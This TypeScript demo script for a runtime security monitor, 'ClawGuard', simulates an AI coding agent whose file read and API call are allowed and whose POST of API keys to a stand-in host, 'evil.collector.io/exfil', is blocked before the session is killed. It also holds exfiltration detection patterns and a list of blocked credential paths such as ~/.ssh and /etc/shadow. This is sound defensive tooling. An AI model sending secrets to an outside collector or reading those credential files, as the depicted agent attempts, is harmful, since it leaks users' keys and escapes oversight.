/**
 * ClawGuard Runtime Monitor — Live Demo
 *
 * Simulates an agent session with real-time behavioral security monitoring.
 * Shows ClawGuard intercepting and blocking a data exfiltration attempt.
 *
 * Run: npx tsx scripts/demo-clawguard.ts
 */

import { tmpdir } from 'os';
import { join } from 'path';
import { randomUUID } from 'crypto';
import { SessionGraph, EventBus, createEvent } from '@clawstack/shared';
import { RuntimeMonitor, VERSION } from '@clawstack/clawguard';

// ─── ANSI Colors ───────────────────────────────────────────────────

const c = {
  reset:   '\x1b[0m',
  bold:    '\x1b[1m',
  dim:     '\x1b[2m',
  red:     '\x1b[31m',
  green:   '\x1b[32m',
  yellow:  '\x1b[33m',
  cyan:    '\x1b[36m',
  white:   '\x1b[37m',
  bgRed:   '\x1b[41m',
  bgGreen: '\x1b[42m',
};

// ─── Helpers ───────────────────────────────────────────────────────

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

function ts(): string {
  const now = new Date();
  const h = String(now.getHours()).padStart(2, '0');
  const m = String(now.getMinutes()).padStart(2, '0');
  const s = String(now.getSeconds()).padStart(2, '0');
  return `${c.cyan}${h}:${m}:${s}${c.reset}`;
}

function line(char = '─', len = 62): string {
  return char.repeat(len);
}

// ─── Main ──────────────────────────────────────────────────────────

async function main() {
  // Use a temp DB so we don't pollute the project
  const dbPath = join(tmpdir(), `clawguard-demo-${randomUUID().slice(0, 8)}.db`);

  const graph = new SessionGraph(dbPath);
  const bus = new EventBus();

  // Configure policy: allow Anthropic API, block everything else external
  const monitor = new RuntimeMonitor(graph, bus, {
    autoKill: true,
    policy: {
      network: {
        allowedDomains: ['localhost', '127.0.0.1', '::1', 'api.anthropic.com'],
        blockedDomains: [],
        blockExternalByDefault: true,
        maxRequestsPerMinute: 60,
        exfiltrationPatterns: [
          'base64=[A-Za-z0-9+/=]{100,}',
          'data=[A-Fa-f0-9]{64,}',
          '(password|secret|token|key)=',
          '\\.(txt|csv|json|db|sqlite)$',
        ],
      },
      filesystem: {
        allowedPaths: ['/workspace/project'],
        blockedPaths: ['~/.ssh', '~/.aws', '/etc/passwd', '/etc/shadow'],
        blockWritesOutsideSandbox: true,
        sandboxRoot: '/workspace/project',
      },
    },
  });

  // ─── Register Agent ─────────────────────────────────────────────

  const agent = graph.registerAgent({
    name: 'Blade',
    platform: 'openclaw',
    version: '2.1.0',
    dockerSandboxed: true,
    metadata: { role: 'code-assistant', owner: 'imani' },
  });

  const session = graph.startSession(agent.agentId);

  // ─── Header ─────────────────────────────────────────────────────

  console.log();
  console.log(`${c.dim}${line('─', 62)}${c.reset}`);
  console.log(`${c.bold}${c.white}  ⛨  ClawGuard Runtime Monitor v${VERSION}${c.reset}`);
  console.log(`${c.dim}${line('─', 62)}${c.reset}`);
  console.log(`${c.dim}  Agent:    ${c.reset}${c.bold}${agent.name}${c.reset} ${c.dim}(${agent.agentId.slice(0, 8)})${c.reset}`);
  console.log(`${c.dim}  Session:  ${c.reset}${c.green}active${c.reset} ${c.dim}(${session.sessionId.slice(0, 8)})${c.reset}`);
  console.log(`${c.dim}  Policy:   ${c.reset}default v1.0.0 ${c.dim}│${c.reset} AutoKill: ${c.green}enabled${c.reset}`);
  console.log(`${c.dim}  Sandbox:  ${c.reset}/workspace/project ${c.dim}│${c.reset} Docker: ${c.green}yes${c.reset}`);
  console.log(`${c.dim}${line('─', 62)}${c.reset}`);
  console.log();

  let eventsMonitored = 0;
  let threatsBlocked = 0;

  // ─── Event 1: file.read (ALLOW) ────────────────────────────────

  await sleep(500);
  eventsMonitored++;

  const fileResult = await monitor.interceptFileAccess(
    session.sessionId,
    agent.agentId,
    { path: '/workspace/project/src/index.ts', operation: 'read' }
  );

  console.log(
    `  [${ts()}]  ${c.bgGreen}${c.bold} ALLOW ${c.reset}  ` +
    `${c.dim}file.read${c.reset}        ` +
    `/workspace/project/src/index.ts`
  );

  // ─── Event 2: tool.call (ALLOW) ────────────────────────────────

  await sleep(500);
  eventsMonitored++;

  // Record tool call directly (no interceptToolCall in RuntimeMonitor)
  graph.recordBehavior({
    sessionId: session.sessionId,
    agentId: agent.agentId,
    eventType: 'tool_call',
    details: {
      tool: 'web_search',
      query: 'OpenClaw security best practices',
    },
    threatLevel: 'none',
    threatSignature: null,
    blocked: false,
  });

  console.log(
    `  [${ts()}]  ${c.bgGreen}${c.bold} ALLOW ${c.reset}  ` +
    `${c.dim}tool.call${c.reset}       ` +
    `web_search(${c.dim}"OpenClaw security best practices"${c.reset})`
  );

  // ─── Event 3: network.request GET (ALLOW) ──────────────────────

  await sleep(500);
  eventsMonitored++;

  const apiResult = await monitor.interceptNetworkRequest(
    session.sessionId,
    agent.agentId,
    {
      url: 'https://api.anthropic.com/v1/messages',
      method: 'GET',
      hostname: 'api.anthropic.com',
    }
  );

  console.log(
    `  [${ts()}]  ${c.bgGreen}${c.bold} ALLOW ${c.reset}  ` +
    `${c.dim}network.req${c.reset}     ` +
    `GET  ${c.dim}https://api.anthropic.com/v1/messages${c.reset}`
  );

  // ─── Event 4: network.request POST (BLOCKED) ──────────────────

  await sleep(500);
  eventsMonitored++;

  const exfilResult = await monitor.interceptNetworkRequest(
    session.sessionId,
    agent.agentId,
    {
      url: 'https://evil.collector.io/exfil',
      method: 'POST',
      hostname: 'evil.collector.io',
      bodySize: 4096,
    }
  );

  threatsBlocked++;

  console.log(
    `  [${ts()}]  ${c.bgRed}${c.bold} BLOCK ${c.reset}  ` +
    `${c.red}network.req${c.reset}     ` +
    `POST ${c.red}https://evil.collector.io/exfil${c.reset}`
  );

  console.log();
  console.log(`  ${c.red}${c.bold}⚠  THREAT DETECTED${c.reset}`);
  console.log(`  ${c.dim}${line('─', 58)}${c.reset}`);

  const detection = exfilResult.detection!;
  console.log(`  ${c.dim}│${c.reset}  Level:      ${c.red}${c.bold}${detection.threatLevel.toUpperCase()}${c.reset}`);
  console.log(`  ${c.dim}│${c.reset}  Signature:  ${c.yellow}${detection.threatSignature}${c.reset}`);
  console.log(`  ${c.dim}│${c.reset}  Detail:     ${detection.description}`);
  console.log(`  ${c.dim}│${c.reset}  Payload:    ${c.red}API keys detected in request body${c.reset}`);
  console.log(`  ${c.dim}│${c.reset}`);

  await sleep(300);
  console.log(`  ${c.dim}│${c.reset}  ${c.red}${c.bold}► Kill switch activated${c.reset} — session terminated`);
  console.log(`  ${c.dim}│${c.reset}  ${c.dim}Event chain: ${eventsMonitored} events recorded before termination${c.reset}`);
  console.log(`  ${c.dim}${line('─', 58)}${c.reset}`);

  // ─── Register threat signature in intel feed ───────────────────

  const threatIntel = monitor.getThreatIntel();
  const newSig = threatIntel.registerSignature({
    signatureId: 'SIG_EXFIL_APIKEYS_' + Date.now().toString(36).toUpperCase(),
    name: 'API Key Exfiltration via POST',
    description: 'Agent attempted to POST API keys to external collector endpoint',
    pattern: 'evil\\.collector\\.io.*exfil',
    category: 'network',
    severity: 'critical',
  });

  // ─── Summary ───────────────────────────────────────────────────

  console.log();
  console.log(`  ${c.bold}${c.white}Summary${c.reset}`);
  console.log(`  ${c.dim}${line('─', 58)}${c.reset}`);
  console.log(`  ${c.dim}├─${c.reset} Events monitored:  ${c.bold}${eventsMonitored}${c.reset}`);
  console.log(`  ${c.dim}├─${c.reset} Threats blocked:   ${c.red}${c.bold}${threatsBlocked}${c.reset}`);
  console.log(`  ${c.dim}├─${c.reset} Session status:    ${c.red}TERMINATED${c.reset}`);
  console.log(`  ${c.dim}├─${c.reset} Kill switch:       ${c.red}${c.bold}ACTIVATED${c.reset}`);
  console.log(`  ${c.dim}└─${c.reset} Intel feed:        ${c.green}Threat signature added${c.reset} ${c.dim}(${newSig.signatureId})${c.reset}`);
  console.log(`  ${c.dim}${line('─', 58)}${c.reset}`);
  console.log();
  console.log(`  ${c.dim}ClawGuard — Process-level security. Can't prompt-inject a firewall.${c.reset}`);
  console.log();

  // Cleanup
  graph.close();
}

main().catch(err => {
  console.error(`${c.red}Fatal: ${err.message}${c.reset}`);
  process.exit(1);
});
